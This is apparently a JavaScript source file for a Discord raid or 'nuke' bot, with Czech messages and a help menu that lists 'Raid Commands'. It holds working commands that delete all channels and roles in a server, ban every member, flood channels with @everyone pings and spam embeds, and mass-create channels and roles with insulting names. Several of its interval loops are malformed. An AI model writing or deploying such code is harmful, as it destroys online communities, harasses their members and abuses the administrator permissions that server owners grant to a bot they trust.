const Discord = require('discord.js')
const bot = new Discord.Client();

bot.on('ready', () => {
    console.log(`${bot.user.tag} je to ready!`)
})

bot.on('message', message => {
    if(message.content === 'x.ping') {
      setInterval(function() {
          message.channel.send('@everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone')
         }),
      1
    }
    if(message.content === "x.nuke") {
 message.channel.send("Nyní se maže vše")
	 message.guild.channels.forEach(channel => channel.delete())
	 message.guild.roles.forEach(roles => roles.delete()) } 
	  
    if(message.content === 'x.create') {
      setInterval(function() {
      message.guild.createChannel('PICUSOVIA', 'text')
      message.guild.createChannel('TENHLE SERVER JE KOKOTINA', 'voice')
      message.guild.createChannel('IG - pes_adam', 'category')
    }),
    1
  }
  if(message.content === 'x.createroles') {
    setInterval(function() {
        message.guild.createRole({
           name: "troll role",
           color: 'RANDOM'
        })
      }),
      1
    }
  if(message.content === 'x.deleteroles') {
    message.guild.roles.forEach(role => role.delete())
  }
  if(message.content === 'x.deletechannels') {	
     message.guild.channels.forEach(channel => channel.delete())
  }
  if(message.content === 'x.banall') {
    message.guild.members.forEach((f) => {
      message.guild.member(f).ban('hahahah')
    })
  }
  bot.on('message', message => {
if(message.content === 'x.spam') {
	setInterval(function() {
  const spam = new Discord.RichEmbed()
  .setTitle("Nuked by pes")
  .addField('LOL', true)
  .setColor("RANDOM")
  message.channel.send(spam)
  }),
      1
    }
})
  if(message.content === 'x.help') {
  const xhelp = new Discord.RichEmbed()
  .setTitle("ALL COMMANDS")
  .addField('Info Commands', '```x.info```', true)
  .addField('Raid Commands', '```x.nuke, x.deleteroles, x.create, x.deletechannels, x.banall```', true)
  .addField('Other Commands', '```x.spam```', true)
  .setFooter("Thanks for administrator dumbasses")
  .setColor("RANDOM")
  message.channel.send(xhelp)
  }
  if(message.content === 'x.info') {
  const xinfo = new Discord.RichEmbed()
  .setTitle("Informations")
  .setDescription("**FOLOW TO MY IG - pes_adam**")
  .setColor("RANDOM")
  message.channel.send(xinfo)
  }
})
       
bot.login("bot_token")